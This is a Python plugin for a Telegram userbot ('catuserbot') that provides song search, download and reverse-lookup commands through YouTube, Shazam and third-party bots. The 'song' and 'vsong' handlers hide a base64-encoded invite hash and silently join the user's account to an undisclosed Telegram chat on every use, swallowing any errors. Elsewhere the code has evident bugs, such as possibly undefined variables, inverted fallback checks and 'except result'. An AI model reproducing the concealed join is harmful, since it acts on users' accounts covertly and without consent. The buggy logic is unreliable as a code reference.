# by  @sandy1709 ( https://t.me/mrconfused  )
# songs finder for catuserbot

# Modified by @kirito6969

import asyncio
import base64
import io
import os
from pathlib import Path

from ShazamAPI import Shazam
from telethon import functions, types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from urlextract import URLExtract
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search, deEmojify, hide_inlinebot

from ..helpers.tools import media_type
from ..helpers.utils import _catutils, reply_id
from . import catub, hmention

plugin_category = "utils"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>wi8..! I am finding your song....</code>"
SONG_NOT_FOUND = "<code>Sorry !I am unable to find any song like that</code>"
SONG_SENDING_STRING = "<code>yeah..! i found something wi8..🥰...</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@catub.cat_cmd(
    pattern="song(320)?(?:\s|$)([\s\S]*)",
    command=("song", plugin_category),
    info={
        "header": "To get songs from youtube.",
        "description": "Basically this command searches youtube and send the first video as audio file.",
        "flags": {
            "320": "if you use song320 then you get 320k quality else 128k quality",
        },
        "usage": "{tr}song <song name>",
        "examples": "{tr}song memories song",
    },
)
async def _(event):
    "To search songs from youtube"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "`What I am Supposed to find `")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    try:
        stderr = (await _catutils.runcmd(song_cmd))[1]
        # if stderr:
        # await catevent.edit(f"**Error1 :** `{stderr}`")
        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
        if stderr:
            return await catevent.edit(f"**Error :** `{stderr}`")
        catname = os.path.splitext(catname)[0]
        song_file = Path(f"{catname}.mp3")
    except:
        pass
    if not os.path.exists(song_file):
        return await catevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    await catevent.edit("`Yeah..! i found something wi8..🥰`")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None
    title = catname.replace("./temp/", "").replace("_", "|")
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"<b><i>➥ Title :- {title}</i></b>\n<b><i>➥ Uploaded by :- {hmention}</i></b>",
        parse_mode="html",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="vsong(?:\s|$)([\s\S]*)",
    command=("vsong", plugin_category),
    info={
        "header": "To get video songs from youtube.",
        "description": "Basically this command searches youtube and sends the first video",
        "usage": "{tr}vsong <song name>",
        "examples": "{tr}vsong memories song",
    },
)
async def _(event):
    "To search video songs from youtube"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "`What I am Supposed to find`")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    name_cmd = name_dl.format(video_link=video_link)
    video_cmd = video_dl.format(video_link=video_link)
    try:
        stderr = (await _catutils.runcmd(video_cmd))[1]
        # if stderr:
        # return await catevent.edit(f"**Error :** `{stderr}`")
        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
        if stderr:
            return await catevent.edit(f"**Error :** `{stderr}`")
        catname = os.path.splitext(catname)[0]
        vsong_file = Path(f"{catname}.mp4")
    except:
        pass
    if not os.path.exists(vsong_file):
        vsong_file = Path(f"{catname}.mkv")
    elif not os.path.exists(vsong_file):
        return await catevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    await catevent.edit("`Yeah..! i found something wi8..🥰`")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None
    title = catname.replace("./temp/", "").replace("_", "|")
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        force_document=False,
        caption=f"<b><i>➥ Title :- {title}</i></b>\n<b><i>➥ Uploaded by :- {hmention}</i></b>",
        parse_mode="html",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="s(a)?z(a)?m$",
    command=("shazam", plugin_category),
    info={
        "header": "To reverse search song.",
        "description": "Reverse search audio file using shazam api",
        "usage": [
            "{tr}shazam <reply to voice/audio>",
            "{tr}szm <reply to voice/audio>",
        ],
    },
)
async def shazamcmd(event):
    "To reverse search song."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "__Reply to Voice clip or Audio clip to reverse search that song.__"
        )
    catevent = await edit_or_reply(event, "__Downloading the audio clip...__")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**Error while reverse searching song:**\n__{e}__"
        )
 
    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**Song:** `{song}`", reply_to=reply
    )
    await catevent.delete()


@catub.cat_cmd(
    pattern="song2(?:\s|$)([\s\S]*)",
    command=("song2", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "description": "Searches the song you entered in query and sends it quality of it is 320k",
        "usage": "{tr}song2 <song name>",
        "examples": "{tr}song2 memories song",
    },
)
async def _(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@songdl_bot"
    reply_id_ = await reply_id(event)
    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message("/start")
        except YouBlockedUserError:
            await edit_or_reply(
                catevent, "**Error:** Trying to unblock & retry, wait a sec..."
            )
            await catub(unblock("songdl_bot"))
            purgeflag = await conv.send_message("/start")
        await conv.get_response()
        await conv.send_message(song)
        hmm = await conv.get_response()
        while hmm.edit_hide is not True:
            await asyncio.sleep(0.1)
            hmm = await event.client.get_messages(chat, ids=hmm.id)
        baka = await event.client.get_messages(chat)
        if baka[0].message.startswith(
            ("I don't like to say this but I failed to find any such song.")
        ):
            await delete_conv(event, chat, purgeflag)
            return await edit_delete(
                catevent, SONG_NOT_FOUND, parse_mode="html", time=5
            )
        await catevent.edit(SONG_SENDING_STRING, parse_mode="html")
        await baka[0].click(0)
        await conv.get_response()
        await conv.get_response()
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>Title :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await catevent.delete()
        await delete_conv(event, chat, purgeflag)

# reverse search by  @Lal_bakthan
@catub.cat_cmd(
    pattern="szm$",
    command=("szm", plugin_category),
    info={
        "header": "To reverse search music file.",
        "description": "music file lenght must be around 10 sec so use ffmpeg plugin to trim it.",
        "usage": "{tr}szm",
    },
)
async def _(event):
    "To reverse search music by bot."
    if not event.reply_to_msg_id:
        return await edit_delete(event, "```Reply to an audio message.```")
    reply_message = await event.get_reply_message()
    chat = "@auddbot"
    catevent = await edit_or_reply(event, "```Identifying the song```")
    async with event.client.conversation(chat) as conv:
        try:
            await conv.send_message("/start")
            await conv.get_response()
            await conv.send_message(reply_message)
            check = await conv.get_response()
            if not check.text.startswith("Audio received"):
                return await catevent.edit(
                    "An error while identifying the song. Try to use a 5-10s long audio message."
                )
            await catevent.edit("Wait just a sec...")
            result = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await catevent.edit("```Please unblock (@auddbot) and try again```")
            return
    namem = f"**Song Name : **`{result.text.splitlines()[0]}`\
        \n\n**Details : **__{result.text.splitlines()[2]}__"
    await catevent.edit(namem)


@catub.cat_cmd(
    pattern="dzd ?(.*)",
    command=("dzd", plugin_category),
    info={
        "header": "To download songs via DeezLoad bot",
        "description": "Spotify/Deezer downloader",
        "usage": "{tr}dzd <song link>",
        "examples": "{tr}dzd https://www.deezer.com/track/3657911",
    },
)
async def dzd(event):
    "To download song via Deezload2bot"
    link = event.pattern_match.group(1)
    reply_message = await event.get_reply_message()
    pro = link or reply_message.text
    extractor = URLExtract()
    plink = extractor.find_urls(pro)
    reply_to_id = await reply_id(event)
    if not link and not reply_message:
        catevent = await edit_delete(
            event, "**I need a link to download something pro. (._.)**"
        )
    else:
        catevent = await edit_or_reply(event, "**Downloading...!**")
    chat = "@deezload2bot"
    async with event.client.conversation(chat) as conv:
        try:
            msg = await conv.send_message(plink)
            details = await conv.get_response()
            song = await conv.get_response()
            """ - don't spam notif - """
            await event.client.send_read_acknowledge(conv.chat_id)
            await catevent.delete()
            await event.client.send_file(
                event.chat_id, song, caption=details.text, reply_to=reply_to_id
            )
            await event.client.delete_messages(
                conv.chat_id, [msg.id, details.id, song.id]
            )
        except YouBlockedUserError:
            await catevent.edit("**Error:** `unblock` @deezload2bot `and retry!`")
            return


@catub.cat_cmd(
    pattern="isong ?(.*)",
    command=("isong", plugin_category),
    info={
        "header": "Inline music downloader by @FeelDeD",
        "usage": ["{tr}isong <song name>", "{tr}isong <reply>"],
    },
)
async def music(event):
    "Download song through @Deezermusicbot"
    if event.fwd_from:
        return
    music = event.pattern_match.group(1)
    if not music:
        if event.is_reply:
            music = (await event.get_reply_message()).text
        else:
            await edit_delete(event, "`Give a song name u Dumb`")
            return
    bot = "@DeezerMusicBot"
    reply_to_id = await reply_id(event)
    try:
        await hide_inlinebot(event.client, bot, music, event.chat_id, reply_to_id)
    except IndexError:
        await edit_delete(event, "`Song not Found`")
    await event.delete()


# By @FeelDeD


@catub.cat_cmd(
    pattern="sdl",
    command=("sdl", plugin_category),
    info={
        "header": "Spotify/Deezer Downloader",
        "usage": [
            "{tr}sdl <song link>",
            "{tr}sdl <reply to a Spotify/Deezer link>",
        ],
    },
)
async def wave(odi):
    "Song Downloader via Bot"
    song = "".join(odi.text.split(maxsplit=1)[1:])
    songr = await odi.get_reply_message()
    reply_to_id = await reply_id(odi)
    link = song or songr.text
    if not link:
        await edit_delete(odi, "`Give me a song link`")
    elif not link:
        await edit_delete(odi, "`Give me a song link`")
    elif ".com" not in link:
        await edit_delete(odi, "`Give me a song link`")
    else:
        await odi.edit("`Downloading ...`")
        chat = "@DeezerMusicBot"
        async with odi.client.conversation(chat) as conv:
            try:
                await odi.client(functions.contacts.UnblockRequest(conv.chat_id))
                start = await conv.send_message("/start")
                await conv.get_response()
                end = await conv.send_message(link)
                music = await conv.get_response()
                if not music.audio:
                    await odi.edit(f"`No result found for {song}`")
                else:
                    result = await odi.client.send_file(
                        odi.chat_id, music, reply_to=reply_to_id, caption=False
                    )
                    await odi.delete()
                msgs = []
                for _ in range(start.id, end.id + 2):
                    msgs.append(_)
                await odi.client.delete_messages(conv.chat_id, msgs)
                await odi.client.send_read_acknowledge(conv.chat_id)
            except result:
                await odi.reply("`Something went Wrong`")


@catub.cat_cmd(
    pattern="lits?(.*)",
    command=("lits", plugin_category),
    info={
        "header": "✨ Get part of a song ✨",
        "examples": "{tr}lits I love you",
        "usage": [
            "{tr}lits <key-word>",
        ],
    },
)
async def lisong(event):
    "Little Song"
    if event.fwd_from:
        return
    bot = "@MeloBot"
    song = event.pattern_match.group(1)
    song = deEmojify(song)
    reply_to_id = await reply_id(event)
    if not song:
        return await edit_delete(event, "Give me a text")
    await event.delete()
    await hide_inlinebot(event.client, bot, song, event.chat_id, reply_to_id)


@catub.cat_cmd(
    pattern="mev ?(.*)",
    command=("mev", plugin_category),
    info={
        "header": "Searches and uploads the meme voice.",
        "usage": "{tr}mev <input>",
        "examples": "{tr}mev Hello motherfucker",
    },
)
async def nope(event):
    "Meme voice by bot"
    mafia = event.pattern_match.group(1)
    lol = deEmojify(mafia)
    bot = "@myinstantsbot"
    reply_to_id = await reply_id(event)
    if not lol:
        if event.is_reply:
            lol = (await event.get_reply_message()).message
        else:
            lol = "bruh"
    await hide_inlinebot(event.client, bot, lol, event.chat_id, reply_to_id)
    await event.delete()


# @TheLoneEssence (Lee Kaze) Pro AF


@catub.cat_cmd(
    pattern="ssong ?(.*)",
    command=("ssong", plugin_category),
    info={
        "header": "It will send you Spotify/Deezer link of your given query.",
        "flags": {"-d": "For Deezer Link"},
        "usage": [
            "{tr}ssong <song name>",
            "{tr}ssong <reply>",
            "{tr}ssong -d <song name>",
            "{tr}ssong -d <reply>",
        ],
    },
)
async def music(event):
    "Generate Spotify/Deezer link from song names"
    if event.fwd_from:
        return
    music = None
    argument = event.pattern_match.group(1)
    await edit_or_reply(event, "`Semding song link, waimt....`")
    try:
        flag = event.pattern_match.group(1).split()[0]
    except IndexError:
        flag = ""

    if "-d" in flag:
        music = event.pattern_match.group(1)[3:]
        if not music and event.reply_to_msg_id:
            music = (await event.get_reply_message()).text or None
    elif argument:
        music = argument
    elif event.reply_to_msg_id:
        music = (await event.get_reply_message()).text or None

    if not music:
        return await edit_delete(event, "`Give a song name B~Baka`")

    bot = "@deezload2bot" if "-d" in flag else "@songdl_bot"
    sike = "Deezer" if "-d" in flag else "Spotify"
    reply_to_id = await reply_id(event)
    run = await event.client.inline_query(bot, music)

    try:
        result = await run[0].click("me")
        await result.delete()
    except IndexError:
        await edit_delete(event, "`Bish, Go and Die!`")
        return

    if not (result.text).startswith("https://"):
        await event.client.send_message(
            event.chat_id,
            f"**✘ Name:** __{music}__\n**✘ Site:** __{sike}__\n**✘ Link:** __SOME ERROR OCCURED__",
            reply_to=reply_to_id,
        )
    else:
        await event.client.send_message(
            event.chat_id,
            f"**✘ Name:** __{music.title()}__\n**✘ Site:** __{sike}__\n**✘ Link:** __{result.text}__",
            link_preview=True,
            reply_to=reply_to_id,
        )

    await event.delete()


# By t.me://feelded


@catub.cat_cmd(
    pattern="isdl",
    command=("isdl", plugin_category),
    info={
        "header": "Spotify/Deezer Downloader",
        "usage": [
            "{tr}isdl <song name>",
        ],
    },
)
async def wave(odi):
    "Inline Song Downloader"
    song = "".join(odi.text.split(maxsplit=1)[1:])
    reply_to_id = await reply_id(odi)
    if not song:
        await edit_delete(odi, "`Give me a song name`", 6)
    else:
        await odi.edit("`Downloading ...`")
        chat = "@DeezerMusicBot"
        inline = "@Deezload2Bot"
        async with odi.client.conversation(chat) as conv:
            try:
                await odi.client(functions.contacts.UnblockRequest(conv.chat_id))
                run = await odi.client.inline_query(inline, song)
                start = await conv.send_message("/start")
                await conv.get_response()
                end = await run[0].click(conv.chat_id)
                music = await conv.get_response()
                if not music.audio:
                    await odi.edit(f"`No result found for {song}`")
                else:
                    result = await odi.client.send_file(
                        odi.chat_id, music, reply_to=reply_to_id, caption=False
                    )
                    await odi.delete()
                msgs = []
                for _ in range(start.id, end.id + 2):
                    msgs.append(_)
                await odi.client.delete_messages(conv.chat_id, msgs)
                await odi.client.send_read_acknowledge(conv.chat_id)
            except Exception:
                await edit_delete(odi, f"`No result found for {song}`", 6)
                
